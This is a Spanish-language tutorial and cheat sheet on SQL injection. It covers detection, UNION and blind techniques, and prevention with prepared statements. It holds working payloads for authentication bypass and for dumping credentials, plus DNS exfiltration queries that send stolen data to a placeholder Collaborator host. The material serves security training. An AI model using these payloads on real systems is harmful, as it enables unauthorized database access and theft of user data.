# SQL Injection

## ¿Qué es la inyección SQL (SQLi)?

La inyección SQL (SQLi) es una vulnerabilidad de seguridad web que permite a un atacante interferir con las consultas que una aplicación realiza a su base de datos. Esto puede permitirle:

* Ver datos que normalmente no debería acceder (credenciales, información personal, etc.).
* Modificar o eliminar datos.
* Escalar el ataque para comprometer el servidor o la infraestructura de backend.
* Realizar ataques de denegación de servicio (DoS).

## Impacto de un ataque exitoso

Un ataque SQLi exitoso puede provocar acceso no autorizado a:

* Contraseñas.
* Detalles de tarjetas de crédito.
* Información personal de los usuarios.

Históricamente, ha sido una de las principales causas de filtraciones de datos de alto perfil.

## Cómo detectar vulnerabilidades SQLi

Puedes detectar SQLi mediante pruebas manuales o con herramientas automatizadas (como Burp Scanner). Algunas pruebas manuales incluyen:

* Insertar un apóstrofe (`'`) y observar si se generan errores.
* Usar operadores booleanos (`OR 1=1` y `OR 1=2`) para analizar la diferencia en las respuestas.
* Inyectar cargas útiles para generar retrasos en la respuesta.
* Utilizar técnicas OAST (Out-of-band Application Security Testing) para detectar interacciones fuera de banda.

### Inyección SQL en diferentes partes de la consulta

Aunque la mayoría de las inyecciones SQL ocurren en la cláusula `WHERE` de una consulta `SELECT`, también pueden presentarse en:

* Sentencias `UPDATE` (en valores actualizados o en la cláusula `WHERE`).
* Sentencias `INSERT` (en valores insertados).
* En la selección de nombres de tablas o columnas.
* En la cláusula `ORDER BY`.

## Ejemplos de ataques SQLi

### Recuperación de datos ocultos

Ejemplo de URL vulnerable:

```
https://insecure-website.com/products?category=Gifts
```

Consulta SQL ejecutada por la aplicación:

```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1;
```

Ataque para ver todos los productos, incluidos los no liberados:

```
https://insecure-website.com/products?category=Gifts'--
```

Esto convierte la consulta en:

```
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1;
```

### Bypass de autenticación

Si la consulta de autenticación es:

```
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese';
```

Un atacante puede iniciar sesión como administrador con la siguiente entrada:

```
Username: administrator'--
Password: (vacío)
```

La consulta modificada será:

```
SELECT * FROM users WHERE username = 'administrator'--' AND password = '';
```

### UNION attack para obtener datos de otras tablas

Si la consulta es:

```
SELECT name, description FROM products WHERE category = 'Gifts';
```

El atacante puede inyectar:

```
' UNION SELECT username, password FROM users--
```

Modificando la consulta para obtener credenciales de usuario:

```
SELECT name, description FROM products WHERE category = '' UNION SELECT username, password FROM users--';
```

### Inyección SQL ciega (Blind SQL Injection)

Cuando la aplicación no devuelve errores ni datos visibles, se pueden usar:

* **Pruebas booleanas**: Alterar la lógica de la consulta y observar cambios en la respuesta.
* **Retrasos por tiempo**: Inyectar consultas que introduzcan pausas (`SLEEP(5)`) y medir la respuesta.
* **Técnicas OAST**: Exfiltración de datos mediante DNS u otros canales fuera de banda.

### Inyección SQL de segundo orden (Second-order SQL Injection)

Ocurre cuando un dato inyectado se almacena en la base de datos y posteriormente se usa en una consulta vulnerable. Es peligrosa porque el ataque no se ejecuta inmediatamente.

### Examinando la base de datos

Una vez identificada una vulnerabilidad SQLi, se pueden extraer datos de la base de datos:

*   Para conocer la versión:

    ```
    SELECT * FROM v$version;  -- Oracle
    ```
*   Para listar tablas:

    ```
    SELECT * FROM information_schema.tables;
    ```
*   Para listar columnas de una tabla específica:

    ```
    SELECT column_name FROM information_schema.columns WHERE table_name='users';
    ```

### Inyección SQL en diferentes contextos

Las inyecciones SQL pueden aparecer en entradas JSON o XML. Ejemplo de SQLi en XML:

```
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

## Cómo Prevenir la Inyección SQL

Puedes prevenir la mayoría de las instancias de inyección SQL usando consultas parametrizadas en lugar de concatenar cadenas dentro de la consulta. Estas consultas parametrizadas también se conocen como **sentencias preparadas**.

### Código Vulnerable

El siguiente código es vulnerable a la inyección SQL porque la entrada del usuario se concatena directamente en la consulta:

```java
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```

### Prevención de Inyección SQL con Sentencias Preparadas

Puedes reescribir este código de manera que evite que la entrada del usuario interfiera con la estructura de la consulta:

```java
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```

### Usos de Consultas Parametrizadas

Puedes usar consultas parametrizadas para cualquier situación donde la entrada no confiable aparezca como datos dentro de la consulta, incluyendo la cláusula **WHERE** y los valores en una sentencia **INSERT** o **UPDATE**. Sin embargo, no pueden usarse para manejar entradas no confiables en otras partes de la consulta, como los nombres de tablas o columnas, o la cláusula **ORDER BY**. La funcionalidad de la aplicación que coloca datos no confiables en estas partes de la consulta debe tomar un enfoque diferente, como:

* **Lista blanca** de valores de entrada permitidos.
* Usar lógica diferente para entregar el comportamiento requerido.

### Requisitos para una Consulta Parametrizada Eficaz

Para que una consulta parametrizada sea eficaz en la prevención de la inyección SQL, la cadena utilizada en la consulta debe ser siempre una constante codificada de manera fija. Nunca debe contener datos variables de ninguna fuente. No te dejes tentar a decidir caso por caso si un dato es confiable y continuar usando concatenación de cadenas dentro de la consulta en casos que se consideren "seguros". Es fácil cometer errores sobre el origen posible de los datos o que cambios en otro código puedan "corromper" los datos confiables.

## SQL Injection Cheat Sheet

Esta "cheat sheet" de SQL injection contiene ejemplos de sintaxis útil que puedes usar para realizar una variedad de tareas que suelen surgir al ejecutar ataques de SQL injection.

### Concatenación de cadenas

Puedes concatenar múltiples cadenas para formar una sola cadena.

| Base de datos | Sintaxis                         |
| ------------- | -------------------------------- |
| Oracle        | `'foo'\|\|'bar'`                 |
| Microsoft     | `'foo'+'bar'`                    |
| PostgreSQL    | `'foo'\|\|'bar'`                 |
| MySQL         | `'foo' 'bar'` \[Nota el espacio] |
|               | `CONCAT('foo','bar')`            |

### Subcadena

Puedes extraer una parte de una cadena, a partir de un desplazamiento especificado con una longitud determinada. Ten en cuenta que el índice de desplazamiento comienza desde 1. Cada una de las siguientes expresiones devolverá la cadena `ba`.

| Base de datos | Sintaxis                    |
| ------------- | --------------------------- |
| Oracle        | `SUBSTR('foobar', 4, 2)`    |
| Microsoft     | `SUBSTRING('foobar', 4, 2)` |
| PostgreSQL    | `SUBSTRING('foobar', 4, 2)` |
| MySQL         | `SUBSTRING('foobar', 4, 2)` |

### Comentarios

Puedes usar comentarios para truncar una consulta y eliminar la parte de la consulta original que sigue a tu entrada.

| Base de datos | Sintaxis                           |
| ------------- | ---------------------------------- |
| Oracle        | `--comentario`                     |
| Microsoft     | `--comentario`                     |
|               | `/*comentario*/`                   |
| PostgreSQL    | `--comentario`                     |
|               | `/*comentario*/`                   |
| MySQL         | `#comentario`                      |
|               | `-- comentario` \[Nota el espacio] |
|               | `/*comentario*/`                   |

### Versión de la base de datos

Puedes consultar la base de datos para determinar su tipo y versión. Esta información es útil cuando formulas ataques más complicados.

| Base de datos | Sintaxis                         |
| ------------- | -------------------------------- |
| Oracle        | `SELECT banner FROM v$version`   |
|               | `SELECT version FROM v$instance` |
| Microsoft     | `SELECT @@version`               |
| PostgreSQL    | `SELECT version()`               |
| MySQL         | `SELECT @@version`               |

### Contenido de la base de datos

Puedes listar las tablas que existen en la base de datos, y las columnas que contienen esas tablas.

| Base de datos | Sintaxis                                                                        |
| ------------- | ------------------------------------------------------------------------------- |
| Oracle        | `SELECT * FROM all_tables`                                                      |
|               | `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`            |
| Microsoft     | `SELECT * FROM information_schema.tables`                                       |
|               | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| PostgreSQL    | `SELECT * FROM information_schema.tables`                                       |
|               | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| MySQL         | `SELECT * FROM information_schema.tables`                                       |
|               | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |

### Errores condicionales

Puedes probar una condición booleana y activar un error en la base de datos si la condición es verdadera.

| Base de datos | Sintaxis                                                                                |
| ------------- | --------------------------------------------------------------------------------------- |
| Oracle        | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`      |
| Microsoft     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`                         |
| PostgreSQL    | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`          |
| MySQL         | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |

### Extracción de datos a través de mensajes de error visibles

Puedes potencialmente provocar mensajes de error que filtren datos sensibles devueltos por tu consulta maliciosa.

| Base de datos | Sintaxis                                                                      |
| ------------- | ----------------------------------------------------------------------------- |
| Microsoft     | `SELECT 'foo' WHERE 1 = (SELECT 'secret')`                                    |
| PostgreSQL    | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)`                    |
| MySQL         | `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))` |

### Consultas encadenadas (Batched queries)

Puedes usar consultas encadenadas para ejecutar múltiples consultas en sucesión. Ten en cuenta que mientras las consultas posteriores se ejecutan, los resultados no se devuelven a la aplicación. Esta técnica se usa principalmente en relación con vulnerabilidades ciegas, donde puedes usar una segunda consulta para activar una búsqueda DNS, un error condicional o un retraso en el tiempo.

| Base de datos | Sintaxis                         |
| ------------- | -------------------------------- |
| Oracle        | No admite consultas encadenadas. |
| Microsoft     | `QUERY-1-HERE; QUERY-2-HERE`     |
|               | `QUERY-1-HERE QUERY-2-HERE`      |
| PostgreSQL    | `QUERY-1-HERE; QUERY-2-HERE`     |
| MySQL         | `QUERY-1-HERE; QUERY-2-HERE`     |

> Nota: En MySQL, normalmente no se pueden usar consultas encadenadas para SQL injection. Sin embargo, esto es posible en ocasiones si la aplicación de destino utiliza ciertas APIs de PHP o Python para comunicarse con una base de datos MySQL.

### Retrasos en el tiempo (Time delays)

Puedes causar un retraso de tiempo en la base de datos cuando se procesa la consulta. Lo siguiente causará un retraso incondicional de 10 segundos.

| Base de datos | Sintaxis                              |
| ------------- | ------------------------------------- |
| Oracle        | `dbms_pipe.receive_message(('a'),10)` |
| Microsoft     | `WAITFOR DELAY '0:0:10'`              |
| PostgreSQL    | `SELECT pg_sleep(10)`                 |
| MySQL         | `SELECT SLEEP(10)`                    |

### Retrasos condicionales en el tiempo

Puedes probar una condición booleana y activar un retraso en el tiempo si la condición es verdadera.

| Base de datos | Sintaxis                                                                                                         |
| ------------- | ---------------------------------------------------------------------------------------------------------------- |
| Oracle        | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| Microsoft     | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`                                                                |
| PostgreSQL    | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`                                  |
| MySQL         | `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`                                                                   |

### Búsqueda DNS

Puedes hacer que la base de datos realice una búsqueda DNS a un dominio externo. Para hacer esto, necesitarás usar Burp Collaborator para generar un subdominio único de Burp Collaborator que usarás en tu ataque y luego consultar el servidor de Collaborator para confirmar que ocurrió una búsqueda DNS.

| Base de datos | Sintaxis                                                                                                                                                                                                |
| ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Oracle        | (Vulnerabilidad XXE) `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual` |
|               | `SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')`                                                                                                                                     |
| Microsoft     | `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`                                                                                                                                             |
| PostgreSQL    | `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`                                                                                                                                    |
| MySQL         | (Solo en Windows) `LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')`                                                                                                                                     |
|               | `SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'`                                                                                                                                          |

### Búsqueda DNS con exfiltración de datos

Puedes hacer que la base de datos realice una búsqueda DNS a un dominio externo que contenga los resultados de una consulta inyectada. Para hacer esto, necesitarás usar Burp Collaborator para generar un subdominio único de Burp Collaborator que usarás en tu ataque y luego consultar el servidor de Collaborator para obtener los detalles de cualquier interacción DNS, incluidos los datos exfiltrados.

| Base de datos | Sintaxis                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Oracle        | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'\|\|(SELECT YOUR-QUERY-HERE)\|\|'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`                                                                                                                                                                                                                                        |
| Microsoft     | `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')`                                                                                                                                                                                                                                                                                                                               |
| PostgreSQL    | <p><code>create OR replace function f() returns void as $$</code><br><code>declare c text;</code><br><code>declare p text;</code><br><code>begin</code><br><code>SELECT into p (SELECT YOUR-QUERY-HERE);</code><br><code>c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';</code><br><code>execute c;</code><br><code>END;</code><br><code>$$ language plpgsql security definer;</code><br><code>SELECT f();</code></p> |
| MySQL         | (Solo en Windows) `SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'`                                                                                                                                                                                                                                                                                                                                                                 |
